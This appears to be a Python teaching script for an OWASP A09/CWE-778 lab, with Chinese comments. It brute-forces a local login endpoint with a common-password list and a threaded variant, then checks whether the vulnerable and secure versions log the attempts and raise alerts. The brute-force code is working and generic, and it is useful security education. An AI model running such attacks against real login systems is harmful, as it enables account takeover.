#!/usr/bin/env python3
"""
A09:2021 - Brute Force Attack Without Detection
CWE-778: Insufficient Logging

攻擊原理：
1. 漏洞版本不記錄失敗的登入嘗試
2. 攻擊者可以進行暴力破解而不被偵測
3. 沒有警報系統來通知管理員
4. 安全版本會記錄所有嘗試並在達到閾值時觸發警報
"""

import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor

# 目標 URL
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"

# 常見密碼列表
COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "iloveyou", "trustno1", "sunshine",
    "princess", "admin", "welcome", "shadow", "superman",
    "admin123", "root", "toor", "pass", "test"
]


def print_response(response):
    """格式化輸出回應"""
    print(f"Status: {response.status_code}")
    try:
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
    except:
        print(response.text[:500])


def attempt_login(url, username, password):
    """嘗試登入"""
    try:
        response = requests.post(
            f"{url}/api/logging/demo/login",
            json={"username": username, "password": password},
            timeout=5
        )
        return response.status_code == 200, password
    except Exception as e:
        return False, password


def brute_force_vulnerable(username="admin", show_progress=True):
    """
    對漏洞版本進行暴力破解
    """
    print("\n" + "="*60)
    print("漏洞版本 - 暴力破解攻擊 (CWE-778)")
    print("="*60)
    
    print(f"\n[*] 目標使用者: {username}")
    print(f"[*] 密碼字典大小: {len(COMMON_PASSWORDS)}")
    print("[*] 開始暴力破解...\n")
    
    failed_attempts = 0
    start_time = time.time()
    
    for password in COMMON_PASSWORDS:
        success, _ = attempt_login(VULNERABLE_URL, username, password)
        
        if success:
            elapsed = time.time() - start_time
            print(f"\n[+] ✓ 密碼破解成功！")
            print(f"[+] 使用者: {username}")
            print(f"[+] 密碼: {password}")
            print(f"[+] 嘗試次數: {failed_attempts + 1}")
            print(f"[+] 耗時: {elapsed:.2f} 秒")
            return True, password
        else:
            failed_attempts += 1
            if show_progress:
                print(f"[{failed_attempts}/{len(COMMON_PASSWORDS)}] 嘗試 '{password}' - 失敗")
    
    elapsed = time.time() - start_time
    print(f"\n[-] 暴力破解失敗")
    print(f"[-] 嘗試次數: {failed_attempts}")
    print(f"[-] 耗時: {elapsed:.2f} 秒")
    return False, None


def check_alerts_vulnerable():
    """
    檢查漏洞版本是否產生了任何警報
    """
    print("\n[*] 檢查是否產生安全警報...")
    
    try:
        response = requests.get(
            f"{VULNERABLE_URL}/api/logging/view/alerts",
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            alerts = data.get("alerts", [])
            brute_force_alerts = [a for a in alerts if a.get("alertType") == "BRUTE_FORCE"]
            
            print(f"\n[*] 總警報數: {len(alerts)}")
            print(f"[*] 暴力破解警報: {len(brute_force_alerts)}")
            
            if len(brute_force_alerts) == 0:
                print("\n[!] ⚠️ 沒有產生暴力破解警報！")
                print("[!] 漏洞：系統無法偵測到暴力破解攻擊")
                print("[!] 攻擊者可以持續嘗試而不被發現")
            
    except Exception as e:
        print(f"[!] 無法檢查警報: {e}")


def check_login_attempts_vulnerable():
    """
    檢查漏洞版本是否記錄了登入嘗試
    """
    print("\n[*] 檢查登入嘗試記錄...")
    
    try:
        response = requests.get(
            f"{VULNERABLE_URL}/api/logging/view/login-attempts?username=admin",
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            attempts = data.get("attempts", [])
            
            print(f"\n[*] 記錄的登入嘗試: {len(attempts)}")
            
            if len(attempts) == 0:
                print("\n[!] ⚠️ 沒有登入嘗試被記錄！")
                print("[!] 漏洞：失敗的登入嘗試沒有被審計")
                
    except Exception as e:
        print(f"[!] 無法檢查記錄: {e}")


def brute_force_secure(username="admin", show_progress=True):
    """
    對安全版本進行暴力破解（應該被偵測）
    """
    print("\n" + "="*60)
    print("安全版本 - 暴力破解偵測")
    print("="*60)
    
    print(f"\n[*] 目標使用者: {username}")
    print("[*] 嘗試 10 次失敗登入以觸發警報...\n")
    
    failed_attempts = 0
    
    for i in range(10):
        password = f"wrong_password_{i}"
        success, _ = attempt_login(SECURE_URL, username, password)
        
        if not success:
            failed_attempts += 1
            if show_progress:
                print(f"[{failed_attempts}/10] 嘗試 '{password}' - 失敗（已記錄）")
        
        time.sleep(0.1)  # 稍微延遲以確保記錄
    
    print(f"\n[*] 完成 {failed_attempts} 次失敗嘗試")
    
    # 檢查是否產生警報
    time.sleep(0.5)
    check_alerts_secure()


def check_alerts_secure():
    """
    檢查安全版本是否產生了警報
    """
    print("\n[*] 檢查安全警報...")
    
    try:
        response = requests.get(
            f"{SECURE_URL}/api/logging/view/alerts",
            headers={"X-User-Role": "ADMIN"},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            alerts = data.get("alerts", [])
            brute_force_alerts = [a for a in alerts if a.get("alertType") == "BRUTE_FORCE"]
            
            print(f"\n[*] 總警報數: {len(alerts)}")
            print(f"[*] 暴力破解警報: {len(brute_force_alerts)}")
            
            if len(brute_force_alerts) > 0:
                print("\n[+] ✓ 暴力破解攻擊被成功偵測！")
                print("[+] 最新警報：")
                for alert in brute_force_alerts[:3]:
                    print(f"    - {alert.get('title')}")
                    print(f"      嚴重程度: {alert.get('severity')}")
                    print(f"      來源 IP: {alert.get('sourceIp')}")
                    
        elif response.status_code == 403:
            print("[*] 需要管理員權限才能查看警報")
            
    except Exception as e:
        print(f"[!] 無法檢查警報: {e}")


def check_login_attempts_secure():
    """
    檢查安全版本的登入嘗試記錄
    """
    print("\n[*] 檢查登入嘗試記錄...")
    
    try:
        response = requests.get(
            f"{SECURE_URL}/api/logging/view/login-attempts?username=admin&hours=1",
            headers={"X-User-Role": "ADMIN"},
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            attempts = data.get("attempts", [])
            failure_count = data.get("failureCount", 0)
            
            print(f"\n[*] 記錄的登入嘗試: {len(attempts)}")
            print(f"[*] 失敗次數: {failure_count}")
            
            if len(attempts) > 0:
                print("\n[+] ✓ 所有登入嘗試都被記錄！")
                print("[+] 這有助於：")
                print("    - 偵測暴力破解攻擊")
                print("    - 追蹤可疑活動")
                print("    - 鑑識調查")
                
    except Exception as e:
        print(f"[!] 無法檢查記錄: {e}")


def parallel_brute_force(url, username, passwords, num_threads=5):
    """
    並行暴力破解
    """
    print(f"\n[*] 並行暴力破解（{num_threads} 個線程）...")
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [
            executor.submit(attempt_login, url, username, pwd)
            for pwd in passwords
        ]
        
        for future in futures:
            success, password = future.result()
            if success:
                print(f"\n[+] 密碼找到: {password}")
                return True, password
    
    return False, None


def main():
    """主函數"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  A09:2021 - Brute Force Attack Without Detection             ║
║  CWE-778: Insufficient Logging                               ║
╠═══════════════════════════════════════════════════════════════╣
║  攻擊方式：暴力破解登入，漏洞版本不會記錄失敗嘗試            ║
║  防禦方式：記錄所有登入嘗試，達到閾值時產生警報              ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        if target == "vulnerable":
            brute_force_vulnerable()
            check_login_attempts_vulnerable()
            check_alerts_vulnerable()
        elif target == "secure":
            brute_force_secure()
            check_login_attempts_secure()
        elif target == "both":
            brute_force_vulnerable()
            check_login_attempts_vulnerable()
            check_alerts_vulnerable()
            print("\n" + "-"*60 + "\n")
            brute_force_secure()
            check_login_attempts_secure()
        else:
            print(f"用法: {sys.argv[0]} [vulnerable|secure|both]")
    else:
        brute_force_vulnerable()
        check_login_attempts_vulnerable()
        check_alerts_vulnerable()
        print("\n" + "-"*60 + "\n")
        brute_force_secure()
        check_login_attempts_secure()
    
    print("\n[*] 演示完成")


if __name__ == "__main__":
    main()
